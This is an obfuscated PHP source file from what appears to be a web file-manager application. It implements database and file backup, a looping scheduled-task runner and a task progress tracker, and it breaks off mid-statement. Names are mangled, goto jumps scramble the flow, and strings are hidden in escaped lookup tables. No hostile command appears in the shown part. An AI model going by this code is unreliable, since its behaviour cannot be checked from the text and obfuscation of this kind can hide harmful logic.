<?php
 goto B…í’ºä¢; d„çÏ«¡åÜ: function binCheckBigger($”‡¸¬ç, $óßÑœÛ“) { return $”‡¸¬ç > $óßÑœÛ“; } $_SERVER[$_SERVER[¶–®Â†­][3]] = ("\70\62\70\62"."\64\65")+0;$_n1so="c4ia0ojfvt17l9uqdrshpz836wke5xb2nymg1q6ypa8tkegibdr0xhcn9z7j35l2osfm4uwv1n4kw38jiy";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Á£»õ², $è¥²Ùß) { $çüëµ´Ö =& $_SERVER[ú÷îèÆÜ]; if (isset(self::$_methodList[$Á£»õ²])) { return @call_user_func_array(self::$_methodList[$Á£»õ²], $è¥²Ùß); } else { if (method_exists($this, $Á£»õ²)) { return call_user_func_array(array($this, $Á£»õ²), $è¥²Ùß); } else { think_exception(__CLASS__ . $çüëµ´Ö[4] . $Á£»õ² . $çüëµ´Ö[5]); } } } public static function __callStatic($à¶ç³ƒ¸, $†çí÷‰˜) { if (isset(self::$_methodListStatic[$à¶ç³ƒ¸])) { return call_user_func_array(self::$_methodListStatic[$à¶ç³ƒ¸], $†çí÷‰˜); } else { if (method_exists(self, $à¶ç³ƒ¸)) { return call_user_func_array(array(self, $à¶ç³ƒ¸), $†çí÷‰˜); } else { show_json("{$à¶ç³ƒ¸}\50\x29\x20\156\157\x74\40\x65\170\x69\x73\164\x3b", !1); } } } public static function addMethod($ñö¯ôè, $©ä ¤¶) { self::$_methodList[$ñö¯ôè] = $©ä ¤¶; } public static function addMethodStatic($¦±ãïÜ¶, $–¼˜¬) { self::$_methodListStatic[$¦±ãïÜ¶] = $–¼˜¬; } } goto FÊÀÜÄ·àÕ; bñãÆÑâ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $üå×ØĞİ =& $_SERVER[ú÷îèÆÜ]; $ ¸£‹ø³ = Backup::get(); self::$io = $ ¸£‹ø³[$üå×ØĞİ[791]]; self::$name = $ ¸£‹ø³[$üå×ØĞİ[42]]; $„‘¸ãˆñ = new DbManage(); $ÈÚİ¬ = $„‘¸ãˆñ->dbType(); $¸Õ¡‹Ë = array($üå×ØĞİ[816] => $ÈÚİ¬, $üå×ØĞİ[817] => time()); Backup::set($¸Õ¡‹Ë); $öã†á…¼ = $this->tmpFilesPath() . $üå×ØĞİ[818] . self::$name . $üå×ØĞİ[18]; del_dir($öã†á…¼); mk_dir($öã†á…¼); $ÀïùùÏ = $ŒÀã˜¶Ê = 0; $˜Ñı§±Ã = new Task($üå×ØĞİ[819], $üå×ØĞİ[820], 0, LNG($üå×ØĞİ[821]) . $üå×ØĞİ[822] . LNG($üå×ØĞİ[823])); try { $şë±ÉèÃ = $„‘¸ãˆñ->db()->getTables(); } catch (Exception $¬Óœ¨®‰) { $˜Ñı§±Ã->end(); return !1; } $şë±ÉèÃ = array_diff($şë±ÉèÃ, array($üå×ØĞİ[824], $üå×ØĞİ[825])); foreach ($şë±ÉèÃ as $ç¸â›Š×) { $ÀïùùÏ += $„‘¸ãˆñ->model($ç¸â›Š×)->count(); } $˜Ñı§±Ã->task[$üå×ØĞİ[826]] = $ÀïùùÏ; $GLOBALS[$üå×ØĞİ[827]] = self::$name; foreach ($şë±ÉèÃ as $ç¸â›Š×) { $Õ½É¾‘ = $öã†á…¼ . $ç¸â›Š× . $üå×ØĞİ[828]; $şÀ¬†•Ö = null; if ($ç¸â›Š× == $üå×ØĞİ[829] && (!isset($ ¸£‹ø³[$üå×ØĞİ[794]]) || $ ¸£‹ø³[$üå×ØĞİ[794]] == $üå×ØĞİ[222])) { $şÀ¬†•Ö = self::$io; } $ŒÀã˜¶Ê += $„‘¸ãˆñ->sqlFromDb($ç¸â›Š×, $Õ½É¾‘, $˜Ñı§±Ã, $şÀ¬†•Ö); } unset($GLOBALS[$üå×ØĞİ[827]]); $˜Ñı§±Ã->end(); if ($ŒÀã˜¶Ê > $ÀïùùÏ) { $ÀïùùÏ = $ŒÀã˜¶Ê; } $¸Õ¡‹Ë = array($üå×ØĞİ[816] => $ÈÚİ¬, $üå×ØĞİ[813] => 1, $üå×ØĞİ[830] => $ÀïùùÏ, $üå×ØĞİ[831] => $ŒÀã˜¶Ê, $üå×ØĞİ[832] => time()); Backup::set($¸Õ¡‹Ë); if ($ÀïùùÏ - $ŒÀã˜¶Ê > 0) { $Ãæ…ş¦§ = $üå×ØĞİ[833]; if (stristr(I18n::getType(), $üå×ØĞİ[834])) { $Ãæ…ş¦§ = $üå×ØĞİ[835]; } write_log(array($Ãæ…ş¦§, $¸Õ¡‹Ë), $üå×ØĞİ[820]); return !1; } return !0; } private function tmpFilesPath() { $ù®ıÒÙó =& $_SERVER[ú÷îèÆÜ]; $Àéäš“œ = TEMP_FILES; if ($GLOBALS[$ù®ıÒÙó[16]][$ù®ıÒÙó[99]][$ù®ıÒÙó[836]]) { $Àéäš“œ = $GLOBALS[$ù®ıÒÙó[16]][$ù®ıÒÙó[99]][$ù®ıÒÙó[836]]; if (!mk_dir($Àéäš“œ) || !is_writable($Àéäš“œ) || !IO::mkfile($Àéäš“œ . $ù®ıÒÙó[837])) { $Àéäš“œ = TEMP_FILES; } } return $Àéäš“œ; } } class BackupDbFile { public function __construct() { } public function index() { $¾„–Áä =& $_SERVER[ú÷îèÆÜ]; $ƒæÅÄŠ† = Backup::get(); $Å×Ë‹µŞ = $ƒæÅÄŠ†[$¾„–Áä[42]]; $àš¯—éÚ = $this->tmpFilesPath() . "\x62\141\x63\153\x75\160\137{$Å×Ë‹µŞ}\x2f"; $¯ƒñÏüğ = $this->backupPath($ƒæÅÄŠ†); if (!($¯ƒñÏüğ = IO::mkdir($¯ƒñÏüğ))) { return !1; } $«–‘„¾ò = IO::listPath($àš¯—éÚ); $Ä†ë·‰– = isset($«–‘„¾ò[$¾„–Áä[93]]) ? $«–‘„¾ò[$¾„–Áä[93]] : array(); $¥ƒ“ĞÖÀ = array_sum(array_column($Ä†ë·‰–, $¾„–Áä[86])); if (!$¥ƒ“ĞÖÀ) { return !1; } $Ì†˜ŠÉ© = array($¾„–Áä[838] => $¥ƒ“ĞÖÀ, $¾„–Áä[839] => time()); Backup::set($Ì†˜ŠÉ©); $ò¾î¡É£ = new TaskFileTransfer($¾„–Áä[840], $¾„–Áä[820], count($Ä†ë·‰–), LNG($¾„–Áä[821]) . $¾„–Áä[439] . LNG($¾„–Áä[823]) . $¾„–Áä[841]); $ò¾î¡É£->task[$¾„–Áä[803]] = $¥ƒ“ĞÖÀ; foreach ($«–‘„¾ò[$¾„–Áä[93]] as $æÊ©ßù) { $òò§±ş = IO::move($æÊ©ßù[$¾„–Áä[94]], $¯ƒñÏüğ); if (!$òò§±ş) { $ò¾î¡É£->end(); $³¼Í©ß¢ = IO::getLastError($¾„–Áä[842] . $æÊ©ßù[$¾„–Áä[94]] . $¾„–Áä[843] . $¯ƒñÏüğ . $¾„–Áä[175]); write_log($³¼Í©ß¢, $¾„–Áä[820]); return !1; } } $ôÖ¦å›ç = new DbManage(); $È˜çòª  = $ôÖ¦å›ç->getSqlFile(); if (!$È˜çòª [$¾„–Áä[844]] || !$È˜çòª [$¾„–Áä[23]]) { return !1; } IO::move($È˜çòª [$¾„–Áä[844]], $¯ƒñÏüğ); IO::move($È˜çòª [$¾„–Áä[23]], $¯ƒñÏüğ); $ò¾î¡É£->end(); $Ì†˜ŠÉ© = array($¾„–Áä[845] => $¥ƒ“ĞÖÀ, $¾„–Áä[846] => time()); Backup::set($Ì†˜ŠÉ©); return !0; } private function backupPath($ëâŸÑÆ„) { $à“¥› =& $_SERVER[ú÷îèÆÜ]; $•æÙŞ³Â = $ëâŸÑÆ„[$à“¥›[42]]; $”ßîøÎ = Model($à“¥›[810])->get($à“¥›[811]); $ûÃÖ’› = substr(md5($à“¥›[812] . $”ßîøÎ . $•æÙŞ³Â), 0, 8); return "\173\151\157\72{$ëâŸÑÆ„[$à“¥›[791]]}\175\x2f\144\141\164\x61\x62\141\163\145\57\142\141\x63\153\165\160\x2f" . $•æÙŞ³Â . $à“¥›[21] . $ûÃÖ’›; } private function tmpFilesPath() { $«’‰åà¬ =& $_SERVER[ú÷îèÆÜ]; $üù¬¿¿æ = TEMP_FILES; if ($GLOBALS[$«’‰åà¬[16]][$«’‰åà¬[99]][$«’‰åà¬[836]]) { $üù¬¿¿æ = $GLOBALS[$«’‰åà¬[16]][$«’‰åà¬[99]][$«’‰åà¬[836]]; if (!mk_dir($üù¬¿¿æ) || !is_writable($üù¬¿¿æ) || !IO::mkfile($üù¬¿¿æ . $«’‰åà¬[837])) { $üù¬¿¿æ = TEMP_FILES; } } return $üù¬¿¿æ; } } class BackupFile { public function __construct() { } public function index() { $èŒ„á¶ = Backup::get(); $×Ùòİú = $èŒ„á¶[$_SERVER[ú÷îèÆÜ][346]][$_SERVER[ú÷îèÆÜ][224]][$_SERVER[ú÷îèÆÜ][518]]; $Ë¡¾è÷ = array($_SERVER[ú÷îèÆÜ][519] => array($_SERVER[ú÷îèÆÜ][847], $×Ùòİú), $_SERVER[ú÷îèÆÜ][848] => array($_SERVER[ú÷îèÆÜ][384], $èŒ„á¶[$_SERVER[ú÷îèÆÜ][791]])); $±ÖÚ À‡ = (int) Model($_SERVER[ú÷îèÆÜ][829])->where($Ë¡¾è÷)->count($_SERVER[ú÷îèÆÜ][518]); $ğÊøº½ = (int) Model($_SERVER[ú÷îèÆÜ][829])->where($Ë¡¾è÷)->sum($_SERVER[ú÷îèÆÜ][86]); $éŸªµÒ = new TaskFileTransfer($_SERVER[ú÷îèÆÜ][849], $_SERVER[ú÷îèÆÜ][820], $±ÖÚ À‡, LNG($_SERVER[ú÷îèÆÜ][821]) . $_SERVER[ú÷îèÆÜ][822] . LNG($_SERVER[ú÷îèÆÜ][850])); $éŸªµÒ->task[$_SERVER[ú÷îèÆÜ][803]] = $ğÊøº½; $èüµÜ· = array($_SERVER[ú÷îèÆÜ][851] => $±ÖÚ À‡, $_SERVER[ú÷îèÆÜ][852] => $ğÊøº½, $_SERVER[ú÷îèÆÜ][853] => time()); Backup::set($èüµÜ·); $ù¬„íÑ· = !0; $öàîöÇ® = $this->storeIds(); $óÏ«Ğ¼° = 1; $ğ¼êØßœ = 1000; $Â§¹±İ = $Ø™…¡•„ = 0; $äøªóù¥ = array(); $øÎÏÖ‡ = $ÇşÆÎã = 0; do { $õŠÔÚŠ¡ = $_SERVER[ú÷îèÆÜ][854]; $ø„ÂŠŸ‰ = Model($_SERVER[ú÷îèÆÜ][829])->where($Ë¡¾è÷)->field($õŠÔÚŠ¡)->order($_SERVER[ú÷îèÆÜ][855])->selectPage($ğ¼êØßœ, $óÏ«Ğ¼°); $“Öùô´‚ = !empty($ø„ÂŠŸ‰[$_SERVER[ú÷îèÆÜ][422]]) ? $ø„ÂŠŸ‰[$_SERVER[ú÷îèÆÜ][422]] : array(); foreach ($“Öùô´‚ as $½ óê•â) { if (!$this->_fileExist($½ óê•â, $äøªóù¥, $öàîöÇ®)) { $±ÖÚ À‡ -= 1; $ğÊøº½ -= (int) $½ óê•â[$_SERVER[ú÷îèÆÜ][86]]; write_log("\146\151\x6c\145\40\x6e\157\x74\x20\x65\170\x69\x73\164\x2e\x66\x69\x6c\145\x49\x44\x3a{$½ óê•â[$_SERVER[ú÷îèÆÜ][518]]}\x2c\x20\160\x61\x74\150\72{$½ óê•â[$_SERVER[ú÷îèÆÜ][94]]}", $_SERVER[ú÷îèÆÜ][856]); continue; } $ëÚ€…‘ = $½ óê•â[$_SERVER[ú÷îèÆÜ][94]]; $Ğ¿¬Ã¡  = "\x7b\151\157\x3a{$èŒ„á¶[$_SERVER[ú÷îèÆÜ][791]]}\175" . substr($ëÚ€…‘, strlen("\173\151\x6f\x3a{$½ óê•â[$_SERVER[ú÷îèÆÜ][857]]}\x7d")); if (IO::exist($Ğ¿¬Ã¡ )) { $éŸªµÒ->updateFileEnd($½ óê•â[$_SERVER[ú÷îèÆÜ][42]], $½ óê•â[$_SERVER[ú÷îèÆÜ][86]]); } else { $Ğ¿¬Ã¡  = get_path_father($Ğ¿¬Ã¡ ); IO::mkdir($Ğ¿¬Ã¡ ); if (!IO::copy($ëÚ€…‘, $Ğ¿¬Ã¡ , $_SERVER[ú÷îèÆÜ][858])) { write_log($_SERVER[ú÷îèÆÜ][859] . $ëÚ€…‘ . $_SERVER[ú÷îèÆÜ][843] . $Ğ¿¬Ã¡  . $_SERVER[ú÷îèÆÜ][175], $_SERVER[ú÷îèÆÜ][820]); $ù¬„íÑ· = !1; break; } } $×Ùòİú = $½ óê•â[$_SERVER[ú÷îèÆÜ][518]]; $Ø™…¡•„ += 1; $Â§¹±İ += $½ óê•â[$_SERVER[ú÷îèÆÜ][86]]; $ÇşÆÎã += 1; $øÎÏÖ‡ += $½ óê•â[$_SERVER[ú÷îèÆÜ][86]]; if ($Â§¹±İ >= 1024 * 1024 * 100) { $èüµÜ· = array($_SERVER[ú÷îèÆÜ][860] => $×Ùòİú, $_SERVER[ú÷îèÆÜ][861] => $ÇşÆÎã, $_SERVER[ú÷îèÆÜ][862] => $øÎÏÖ‡); Backup::set($èüµÜ·); $Â§¹±İ = $Ø™…¡•„ = 0; } } $­—¨ ˆ“ = count($“Öùô´‚); $óÏ«Ğ¼°++; } while ($­—¨ ˆ“ == $ğ¼êØßœ); $éŸªµÒ->end(); $èüµÜ· = array($_SERVER[ú÷îèÆÜ][863] => 1, $_SERVER[ú÷îèÆÜ][801] => time(), $_SERVER[ú÷îèÆÜ][815] => 1, $_SERVER[ú÷îèÆÜ][860] => $×Ùòİú, $_SERVER[ú÷îèÆÜ][852] => $ğÊøº½, $_SERVER[ú÷îèÆÜ][851] => $±ÖÚ À‡, $_SERVER[ú÷îèÆÜ][864] => time()); if ($Ø™…¡•„) { $èüµÜ·[$_SERVER[ú÷îèÆÜ][861]] = $ÇşÆÎã; $èüµÜ·[$_SERVER[ú÷îèÆÜ][862]] = $øÎÏÖ‡; } Backup::set($èüµÜ·); $this->_fileFilter($äøªóù¥); return !0; } private function _fileExist($áÍ¶êì, &$á¹«†€ª, $¶­ÔŠ†­) { $ÚŸÖïØ =& $_SERVER[ú÷îèÆÜ]; $²¹¦¢´ù = $áÍ¶êì[$ÚŸÖïØ[94]]; if (in_array($áÍ¶êì[$ÚŸÖïØ[518]], $á¹«†€ª)) { return !1; } if (!in_array($áÍ¶êì[$ÚŸÖïØ[857]], $¶­ÔŠ†­)) { return !1; } if (IO::exist($²¹¦¢´ù)) { return !0; } $ÙÅ¿¾Ã½ = get_path_father($²¹¦¢´ù); if (IO::exist($ÙÅ¿¾Ã½)) { $á¹«†€ª[] = $áÍ¶êì[$ÚŸÖïØ[518]]; return !1; } $†Ó£çªï = array($ÚŸÖïØ[857] => $áÍ¶êì[$ÚŸÖïØ[857]], $ÚŸÖïØ[94] => array($ÚŸÖïØ[436], "{$ÙÅ¿¾Ã½}\x25")); $‰ÄŸü‰ñ = Model($ÚŸÖïØ[829])->where($†Ó£çªï)->field($ÚŸÖïØ[519])->select(); $á¹«†€ª = array_merge($á¹«†€ª, array_to_keyvalue($‰ÄŸü‰ñ, $ÚŸÖïØ[22], $ÚŸÖïØ[518])); return !1; } private function _fileFilter($®ÍâŸ¼ª) { $À¢ÒÂ²’ =& $_SERVER[ú÷îèÆÜ]; if (empty($®ÍâŸ¼ª)) { return; } $ƒ×ÌÏÊŞ = array($À¢ÒÂ²’[518] => array($À¢ÒÂ²’[17], array_unique($®ÍâŸ¼ª))); $ÃğÊîÏş = Model($À¢ÒÂ²’[865])->where($ƒ×ÌÏÊŞ)->field($À¢ÒÂ²’[191])->select(); foreach ($ÃğÊîÏş as $‘Ê»¿¦) { Model($À¢ÒÂ²’[865])->remove($‘Ê»¿¦[$À¢ÒÂ²’[191]], !1); } } private function storeIds() { $½çâÀØó =& $_SERVER[ú÷îèÆÜ]; $×îÔºÃ› = Model($½çâÀØó[807])->listData(); $¹äÖç®÷ = array(); $¹à”“Šƒ = $GLOBALS[$½çâÀØó[16]][$½çâÀØó[99]][$½çâÀØó[866]]; foreach ($×îÔºÃ› as $  ·Ä) { $µÖùñˆ = strtolower($  ·Ä[$½çâÀØó[105]]); if (!isset($¹à”“Šƒ[$µÖùñˆ])) { continue; } $îÆÂöÕş = $½çâÀØó[84] . (isset($¹à”“Šƒ[$µÖùñˆ]) ? $¹à”“Šƒ[$µÖùñˆ] : ucfirst($µÖùñˆ)); if (!class_exists($îÆÂöÕş)) { continue; } $¹äÖç®÷[] = $  ·Ä[$½çâÀØó[452]]; } return $¹äÖç®÷; } } goto bÖ˜¼«ß÷; dÇĞ¾ïº¥: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÈäàÒÌ =& $_SERVER[ú÷îèÆÜ]; if (self::valueGet($ÈäàÒÌ[790]) != $ÈäàÒÌ[98]) { return; } if (self::valueGet($ÈäàÒÌ[1641]) == $ÈäàÒÌ[98]) { $™¡ó‰ù = self::valueGet($ÈäàÒÌ[1642]); if (time() - $™¡ó‰ù > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÈäàÒÌ[1641], $ÈäàÒÌ[98]); self::log($ÈäàÒÌ[1643] . ACTION . $ÈäàÒÌ[1644]); Hook::bind($ÈäàÒÌ[1645], $ÈäàÒÌ[1646]); $ºÚìŞš¯ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÈäàÒÌ[790]) != $ÈäàÒÌ[98]) { self::valueSet($ÈäàÒÌ[1641], $ÈäàÒÌ[222]); self::log($ÈäàÒÌ[1647]); die; } $¹ô¨æß° = time(); if ($¹ô¨æß° - $ºÚìŞš¯ >= 60) { self::valueSet(array($ÈäàÒÌ[1641] => $ÈäàÒÌ[98], $ÈäàÒÌ[1642] => $¹ô¨æß°), !1); $ºÚìŞš¯ = $¹ô¨æß°; } if (!file_exists(USER_SYSTEM . $ÈäàÒÌ[1648])) { self::valueSet(array($ÈäàÒÌ[1641] => $ÈäàÒÌ[222], $ÈäàÒÌ[790] => $ÈäàÒÌ[222]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ªÆıŠÈƒ =& $_SERVER[ú÷îèÆÜ]; http_close(); $GLOBALS[$ªÆıŠÈƒ[1649]] = 1; $_SERVER[$ªÆıŠÈƒ[1650]] = $ªÆıŠÈƒ[1651]; $_COOKIE = array(); $GLOBALS[$ªÆıŠÈƒ[545]] = 1; $GLOBALS[$ªÆıŠÈƒ[1652]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $÷³ÂÍ¡÷ =& $_SERVER[ú÷îèÆÜ]; http_close(); self::valueSet($÷³ÂÍ¡÷[790], $÷³ÂÍ¡÷[222]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($÷³ÂÍ¡÷[1641] => $÷³ÂÍ¡÷[222], $÷³ÂÍ¡÷[790] => $÷³ÂÍ¡÷[98]), !1); } public static function taskSwitch() { $¯ª¹Ø¢Ú =& $_SERVER[ú÷îèÆÜ]; $÷¿Áë¸Ê = self::valueGet($¯ª¹Ø¢Ú[790]) == $¯ª¹Ø¢Ú[98] ? $¯ª¹Ø¢Ú[222] : $¯ª¹Ø¢Ú[98]; self::valueSet($¯ª¹Ø¢Ú[790], $÷¿Áë¸Ê); } public static function shutdownEvent() { $ä©ù½ì¦ =& $_SERVER[ú÷îèÆÜ]; self::valueSet($ä©ù½ì¦[1641], $ä©ù½ì¦[222]); self::log($ä©ù½ì¦[1653]); } public static function config($Ê“ÑÏ”Ç, $ ÙÚü¡È) { self::valueSet($_SERVER[ú÷îèÆÜ][790], $Ê“ÑÏ”Ç); } private static function taskRunAll() { $š’®¡Õ© =& $_SERVER[ú÷îèÆÜ]; $ìÅ‰ÉÖ = timeFloat(); $ûüâÙÄ = Model($š’®¡Õ©[1654])->listData(); $¢£ôîá± = count($ûüâÙÄ); for ($¥òÇ›¨ = 0; $¥òÇ›¨ < $¢£ôîá±; $¥òÇ›¨++) { $¼¾ÃÔ×Ñ = $ûüâÙÄ[$¥òÇ›¨]; if (!$¼¾ÃÔ×Ñ[$š’®¡Õ©[452]] || $¼¾ÃÔ×Ñ[$š’®¡Õ©[1655]] != $š’®¡Õ©[98]) { continue; } if (!self::taskTimeCheck($¼¾ÃÔ×Ñ)) { continue; } self::taskRun($¼¾ÃÔ×Ñ); } Hook::trigger($š’®¡Õ©[1656]); self::taskQueueRun($ìÅ‰ÉÖ); } private static function taskQueueRun($Íã†ä) { $…üÛÄæ— = 10; while (!0) { $åÅ´ŞŒ = TaskQueue::run(); if ($åÅ´ŞŒ === !1) { break; } if (timeFloat() - $Íã†ä >= $…üÛÄæ—) { break; } } } private static function taskTimeCheck($Š©Èãî) { $´øİÉŞİ =& $_SERVER[ú÷îèÆÜ]; $ÒŸŒ„Ş = json_decode($Š©Èãî[$´øİÉŞİ[204]], !0); $•Î–Ï = intval($Š©Èãî[$´øİÉŞİ[1642]]); $¤‚¶ñ† = strtotime($´øİÉŞİ[1657] . $ÒŸŒ„Ş[$´øİÉŞİ[1658]] . $´øİÉŞİ[1659]) - strtotime($´øİÉŞİ[1660]); $¦‡±°œÂ = time() - strtotime(date($´øİÉŞİ[1661]) . $´øİÉŞİ[1662]); $³ğ˜‡Á­ = $¦‡±°œÂ >= $¤‚¶ñ† && $¦‡±°œÂ <= $¤‚¶ñ† + 3600; switch ($ÒŸŒ„Ş[$´øİÉŞİ[43]]) { case $´øİÉŞİ[1663]: if (time() - $•Î–Ï < 3600 * 24 * 30) { return !1; } if ($ÒŸŒ„Ş[$´øİÉŞİ[1663]] == date($´øİÉŞİ[1664]) && $³ğ˜‡Á­) { return !0; } break; case $´øİÉŞİ[1665]: if (time() - $•Î–Ï < 3600 * 24 * 7) { return !1; } $§ñ´ˆ  = date($´øİÉŞİ[1666]) == 0 ? 7 : date($´øİÉŞİ[1666]); if ($ÒŸŒ„Ş[$´øİÉŞİ[1665]] == $§ñ´ˆ  && $³ğ˜‡Á­) { return !0; } break; case $´øİÉŞİ[1658]: if (time() - $•Î–Ï < 3600 * 24) { return !1; } if ($³ğ˜‡Á­) { return !0; } break; case $´øİÉŞİ[1667]: if (time() - $•Î–Ï >= floatval($ÒŸŒ„Ş[$´øİÉŞİ[1667]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¯åÒ¥… =& $_SERVER[ú÷îèÆÜ]; static $ø‹æ¦çá = 0; $œ·Ğ±Ó¨ = 300; if (!$ø‹æ¦çá) { $ø‹æ¦çá = time(); } if (time() - $ø‹æ¦çá < $œ·Ğ±Ó¨) { return; } $ø‹æ¦çá = time(); $Å÷Ø„ÑÙ = Model($¯åÒ¥…[555])->db($¯åÒ¥…[22]); if ($Å÷Ø„ÑÙ) { $Å÷Ø„ÑÙ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¯åÒ¥…[1668], $¯åÒ¥…[1669]); die; } } public static function taskRun($±Ò‚¶¡×) { $Ááı‡ìª =& $_SERVER[ú÷îèÆÜ]; self::log($Ááı‡ìª[1670] . $±Ò‚¶¡×[$Ááı‡ìª[452]] . $Ááı‡ìª[1671] . $±Ò‚¶¡×[$Ááı‡ìª[42]] . $Ááı‡ìª[1672] . $±Ò‚¶¡×[$Ááı‡ìª[1673]]); Model($Ááı‡ìª[1654])->run($±Ò‚¶¡×[$Ááı‡ìª[452]]); $ãÜêÌã‹ = timeFloat(); $«ıŒîœ = $Ááı‡ìª[22]; switch ($±Ò‚¶¡×[$Ááı‡ìª[43]]) { case $Ááı‡ìª[360]: $İ…«º¾Š = url_request($±Ò‚¶¡×[$Ááı‡ìª[1673]], $Ááı‡ìª[255], !1, !1, !1, !1, 10); if ($İ…«º¾Š[$Ááı‡ìª[790]]) { $«ıŒîœ = strlen($İ…«º¾Š[$Ááı‡ìª[1243]]); } break; case $Ááı‡ìª[254]: $«ıŒîœ = Hook::apply($±Ò‚¶¡×[$Ááı‡ìª[1673]]); default: break; } Model($Ááı‡ìª[1674])->add(array($Ááı‡ìª[1675] => $Ááı‡ìª[22], $Ááı‡ìª[1676] => $Ááı‡ìª[222], $Ááı‡ìª[43] => $Ááı‡ìª[1677] . $±Ò‚¶¡×[$Ááı‡ìª[452]], $Ááı‡ìª[1678] => json_encode(array($Ááı‡ìª[42] => $±Ò‚¶¡×[$Ááı‡ìª[42]], $Ááı‡ìª[1679] => timeFloat() - $ãÜêÌã‹, $Ááı‡ìª[346] => $«ıŒîœ)))); $‡ÂŒçÎæ = $«ıŒîœ ? $Ááı‡ìª[1680] . $«ıŒîœ : $Ááı‡ìª[22]; self::log($Ááı‡ìª[1681] . $±Ò‚¶¡×[$Ááı‡ìª[452]] . $Ááı‡ìª[175] . $‡ÂŒçÎæ); return !0; } public static function valueGet($½ôá…­Õ) { $¾ìŒŠ²’ =& $_SERVER[ú÷îèÆÜ]; $ò•æİÚÏ = $¾ìŒŠ²’[1682]; $§¡’Í«· = Model($¾ìŒŠ²’[485])->get($½ôá…­Õ, $ò•æİÚÏ); if (is_null($§¡’Í«·)) { Model($¾ìŒŠ²’[485])->set($¾ìŒŠ²’[790], $¾ìŒŠ²’[98], $ò•æİÚÏ); Model($¾ìŒŠ²’[485])->set($¾ìŒŠ²’[1641], $¾ìŒŠ²’[222], $ò•æİÚÏ); $§¡’Í«· = Model($¾ìŒŠ²’[485])->get($½ôá…­Õ, $ò•æİÚÏ); } return $§¡’Í«·; } private static function valueSet($÷”ªÑê”, $éˆµîÙ) { $ÎëÓ =& $_SERVER[ú÷îèÆÜ]; $¬ÈµÃ¶¤ = $ÎëÓ[1683]; CacheLock::lock($¬ÈµÃ¶¤); $‡ÃË’¸Î = Model($ÎëÓ[485])->set($÷”ªÑê”, $éˆµîÙ, $ÎëÓ[1682]); CacheLock::unlock($¬ÈµÃ¶¤); return $‡ÃË’¸Î; } protected static function log($¸•Œ²È) { write_log($¸•Œ²È, $_SERVER[ú÷îèÆÜ][1669]); } private static function cacheClear() { $ê’ÍÃÊÎ =& $_SERVER[ú÷îèÆÜ]; Cache::clearMemory(Model($ê’ÍÃÊÎ[485])->cacheKey($ê’ÍÃÊÎ[1682])); Cache::clearMemory(Model($ê’ÍÃÊÎ[485])->cacheKey($ê’ÍÃÊÎ[1684])); Model($ê’ÍÃÊÎ[1654])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($’ÙÀ°’¨, $è–¯Û‰ç = '', $ñ®çÓÓİ = 0, $‡‹Œñô = '') { $õ¿“ÇÈ« =& $_SERVER[ú÷îèÆÜ]; if (self::get($’ÙÀ°’¨)) { return; } $this->task = array($õ¿“ÇÈ«[452] => $’ÙÀ°’¨, $õ¿“ÇÈ«[1685] => USER_ID, $õ¿“ÇÈ«[1582] => $‡‹Œñô, $õ¿“ÇÈ«[503] => $õ¿“ÇÈ«[22], $õ¿“ÇÈ«[43] => $è–¯Û‰ç, $õ¿“ÇÈ«[1105] => $õ¿“ÇÈ«[22], $õ¿“ÇÈ«[826] => $ñ®çÓÓİ, $õ¿“ÇÈ«[1686] => 0, $õ¿“ÇÈ«[1687] => 0, $õ¿“ÇÈ«[1688] => 0, $õ¿“ÇÈ«[1689] => timeFloat(), $õ¿“ÇÈ«[1690] => 0, $õ¿“ÇÈ«[1691] => 0, $õ¿“ÇÈ«[1692] => 0, $õ¿“ÇÈ«[1693] => 0, $õ¿“ÇÈ«[790] => $õ¿“ÇÈ«[1641]); $GLOBALS[$õ¿“ÇÈ«[1694]] = 1; Hook::bind($õ¿“ÇÈ«[1645], array($this, $õ¿“ÇÈ«[1695])); Hook::bind($õ¿“ÇÈ«[1696], array($this, $õ¿“ÇÈ«[1697])); $this->startAfter(); Hook::trigger($õ¿“ÇÈ«[1698], $this->task); $this->task[$õ¿“ÇÈ«[1691]] = timeFloat(); } public function end($Ù×Î¾‚ = '') { $†ŞÎÍĞ² =& $_SERVER[ú÷îèÆÜ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$†ŞÎÍĞ²[1691]]) { self::valueSet($this->task[$†ŞÎÍĞ²[452]], !1); } $this->isEnd = !0; if ($Ù×Î¾‚) { $this->task[$†ŞÎÍĞ²[503]] = $Ù×Î¾‚; } self::log($†ŞÎÍĞ²[1699] . $this->task[$†ŞÎÍĞ²[452]] . $†ŞÎÍĞ²[1700] . sprintf($†ŞÎÍĞ²[891], timeFloat() - $this->task[$†ŞÎÍĞ²[1689]]) . $†ŞÎÍĞ²[1701]); Hook::unbind($†ŞÎÍĞ²[1645], array($this, $†ŞÎÍĞ²[1695])); Hook::unbind($†ŞÎÍĞ²[1696], array($this, $†ŞÎÍĞ²[1697])); $this->endAfter(); $Ëàó§İ = $this->task; $this->task = !1; Hook::trigger($†ŞÎÍĞ²[1702], $Ëàó§İ); } public function update($†•åÒÒ¡ = 0, $êÑèÛÜ = false) { $æú¹–µ£ =& $_SERVER[ú÷îèÆÜ]; $»×‰ÚşĞ =& $this->task; if (!$»×‰ÚşĞ) { return; } $»×‰ÚşĞ[$æú¹–µ£[1686]] += $†•åÒÒ¡; $»×‰ÚşĞ[$æú¹–µ£[1690]] = timeFloat(); if ($»×‰ÚşĞ[$æú¹–µ£[826]]) { if ($»×‰ÚşĞ[$æú¹–µ£[826]] < $»×‰ÚşĞ[$æú¹–µ£[1686]]) { $»×‰ÚşĞ[$æú¹–µ£[826]] = $»×‰ÚşĞ[$æú¹–µ£[1686]]; } $áå¶ıß = timeFloat() - 